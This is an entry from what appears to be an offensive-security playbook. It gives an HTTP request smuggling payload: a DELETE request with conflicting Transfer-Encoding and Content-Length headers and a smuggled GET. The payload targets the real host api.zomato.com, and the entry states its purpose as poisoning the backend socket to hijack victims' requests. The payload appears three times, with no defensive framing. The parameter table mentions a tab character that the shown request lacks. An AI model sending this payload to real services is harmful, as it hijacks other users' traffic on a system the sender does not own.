---
data: |-
  DELETE / HTTP/1.1
  Transfer-Encoding: chunked
  Host: api.zomato.com
  Content-Length: 51
  User-Agent: Treasure/6.7
  0

  GET /some/other/endpoint HTTP/1.1
  X-Ignore: X[STOP]
tags:
  - http-smuggling
  - socket-poisoning
type: command
executor: http
platforms:
  - Web
id: 9f1f2d35-6881-4001-a804-c60bf20902f2
created_at: '2025-12-13T09:01:26.143Z'
updated_at: '2025-12-13T09:01:26.143Z'
verified: false
validated: true
submitted: true
---
# HTTP Smuggling Payload to Hijack

## Command

```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7
0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

## Description

Smuggles a request to poison the backend socket and hijack victim requests by prepending data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Targets api.zomato.com | Yes |
| `Content-Length` | Sets request size to 51 | Yes |
| `Transfer-Encoding` | Chunked with tab for desync | Yes |

## Examples

### Basic Usage

```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7
0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

## Expected Output

Backend socket poisoned; no direct output.

## Related

- [[procedures/Craft-HTTP-Smuggling-Payload-to-Poison-Socket]]
